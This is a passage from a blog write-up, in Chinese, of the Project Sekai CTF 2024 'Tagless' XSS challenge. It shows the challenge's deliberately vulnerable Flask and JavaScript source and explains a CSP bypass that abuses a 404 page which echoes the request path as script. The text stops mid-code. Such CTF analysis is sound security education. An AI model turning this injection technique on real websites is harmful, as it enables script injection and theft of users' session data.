<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before all整場solver都是我qwq WEBTagless Solver: Whale120  一道XSS的題目app.py   123456789101112131415161718192021222324252627282930313233343536373839404142434445from flask import Flask, render_template, make_r">
<meta property="og:type" content="article">
<meta property="og:title" content="Project Sekai CTF 2024 Writeup by ICEDTEA">
<meta property="og:url" content="http://wha13.github.io/2024/08/26/2024-sekaictf/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before all整場solver都是我qwq WEBTagless Solver: Whale120  一道XSS的題目app.py   123456789101112131415161718192021222324252627282930313233343536373839404142434445from flask import Flask, render_template, make_r">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/ry_BgO_sA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hk2pU_OiR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkwKwOOjA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyMC-K_iA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJqxcO_sR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1BOTnuiR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkfZGpdiR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyeVfadoC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1F346djR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1daJtuoC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyA3eK_iC.png">
<meta property="article:published_time" content="2024-08-26T09:12:28.000Z">
<meta property="article:modified_time" content="2024-08-26T09:14:23.908Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="XSS">
<meta property="article:tag" content="CSP">
<meta property="article:tag" content="apk">
<meta property="article:tag" content="Competitive Programming">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/ry_BgO_sA.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Project Sekai CTF 2024 Writeup by ICEDTEA</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/08/26/2024-hitcon/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/08/12/pwnable-tw-orw/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/08/26/2024-sekaictf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&text=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&is_video=false&description=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Project Sekai CTF 2024 Writeup by ICEDTEA&body=Check out this article: http://wha13.github.io/2024/08/26/2024-sekaictf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&name=Project Sekai CTF 2024 Writeup by ICEDTEA&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/08/26/2024-sekaictf/&t=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tagless"><span class="toc-number">1.1.1.</span> <span class="toc-text">Tagless</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crack-Me"><span class="toc-number">1.2.1.</span> <span class="toc-text">Crack Me</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PPC"><span class="toc-number">1.3.</span> <span class="toc-text">PPC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Miku-vs-Machine"><span class="toc-number">1.3.1.</span> <span class="toc-text">Miku vs. Machine</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Project Sekai CTF 2024 Writeup by ICEDTEA
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-08-26T09:12:28.000Z" class="dt-published" itemprop="datePublished">2024-08-26</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CSP/" rel="tag">CSP</a>, <a class="p-category" href="/tags/Competitive-Programming/" rel="tag">Competitive Programming</a>, <a class="p-category" href="/tags/XSS/" rel="tag">XSS</a>, <a class="p-category" href="/tags/apk/" rel="tag">apk</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h1><p><del>整場solver都是我qwq</del></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Tagless"><a href="#Tagless" class="headerlink" title="Tagless"></a>Tagless</h3><blockquote>
<p>Solver: Whale120</p>
</blockquote>
<p>一道XSS的題目<br><strong>app.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, make_response,request</span><br><span class="line"><span class="keyword">from</span> bot <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_security_headers</span>(<span class="params">resp</span>):</span><br><span class="line">    resp.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&quot;script-src &#x27;self&#x27;; style-src &#x27;self&#x27; https://fonts.googleapis.com https://unpkg.com &#x27;unsafe-inline&#x27;; font-src https://fonts.gstatic.com;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/report&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    bot = Bot()</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            parsed_url = urlparse(url)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid URL.&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> parsed_url.scheme <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>]:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid scheme.&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> parsed_url.hostname <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;localhost&quot;</span>]:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid host.&quot;</span>&#125;, <span class="number">401</span></span><br><span class="line">        </span><br><span class="line">        bot.visit(url)</span><br><span class="line">        bot.close()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;visited&quot;</span>:url&#125;, <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;URL parameter is missing!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">error</span>):</span><br><span class="line">    path = request.path</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;path&#125;</span> not found&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>bot的部分就是再正常不過的Chrome無頭瀏覽器設定好cookie(flag)後造訪。<br>先來看csp：  </p>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">script-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">style-src</span> <span class="string">&#x27;self&#x27;</span> https://fonts.googleapis.com https://unpkg.com <span class="string">&#x27;unsafe-inline&#x27;</span>; <span class="keyword">font-src</span> https://fonts.gstatic.com;</span><br></pre></td></tr></table></figure>
<p><code>script-src</code>的部分設定了self，再仔細看看網站404的功能會發現他完整輸出了path，那不就跟<a target="_blank" rel="noopener" href="https://hurricanelabs.com/blog/bypassing-csp-with-jsonp-endpoints/">利用jsonp bypass csp(link)</a>的trick有異曲同工之妙，簡單舉個例子：<br>在這裡，我可以透過造訪<code>http://127.0.0.1:5000/**/alert(1);//.js</code>獲得一段像這樣的內容：<br><img src="https://hackmd.io/_uploads/ry_BgO_sA.png" alt="image"><br>這不就裸裸的js codeㄌ<br>引入js這塊算解決了…嗎?<br>答案是否定的，看看index.html和app.js<br><strong>index.html</strong>  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Tagless<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://fonts.googleapis.com/css?family=Press+Start+2P&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://unpkg.com/nes.css@2.3.0/css/nes.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span>, <span class="selector-tag">html</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#212529</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Press Start 2P&#x27;</span>, cursive;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nes-field</span>, <span class="selector-class">.nes-btn</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">iframe</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#212529</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#FFF</span>; </span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Press Start 2P&#x27;</span>, cursive;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nes-container</span><span class="selector-class">.is-dark</span><span class="selector-class">.with-title</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#212529</span>; </span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;nes-container with-title is-centered is-dark&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>Tagless Display<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;nes-field is-inline&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;userInput&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nes-text is-primary&quot;</span>&gt;</span>Your Message:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;userInput&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nes-input&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Hello, Retro World!&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;displayButton&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nes-btn is-primary&quot;</span>&gt;</span>Display<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;output&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;displayFrame&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>怎麼樣，看起來是不是會被塞進iframe，那iframe有個特性，就是所有被執行的javascript必須是被嵌入的網站本身有的，或者在iframe裡面有個 <code>srcdoc</code> 的選項，詳細資訊可以看這篇：<a target="_blank" rel="noopener" href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/">huli大大的筆記</a><br>不過更重要的，先來看app.js!<br><strong>app.js</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> displayButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;displayButton&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    displayButton.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">displayInput</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sanitizeInput</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    str = str.<span class="title function_">replace</span>(<span class="regexp">/&lt;.*&gt;/igm</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&lt;\.*&gt;/igm</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&lt;.*&gt;.*&lt;\/.*&gt;/igm</span>, <span class="string">&#x27;&#x27;</span>); </span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">autoDisplay</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line">    <span class="keyword">const</span> input = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;auto_input&#x27;</span>);</span><br><span class="line">    <span class="title function_">displayInput</span>(input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">displayInput</span>(<span class="params">input</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line">    <span class="keyword">const</span> fulldisplay = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;fulldisplay&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sanitizedInput = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (input) &#123;</span><br><span class="line">        sanitizedInput = <span class="title function_">sanitizeInput</span>(input);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> userInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;userInput&quot;</span>).<span class="property">value</span>;</span><br><span class="line">        sanitizedInput = <span class="title function_">sanitizeInput</span>(userInput);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;displayFrame&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> iframeContent = 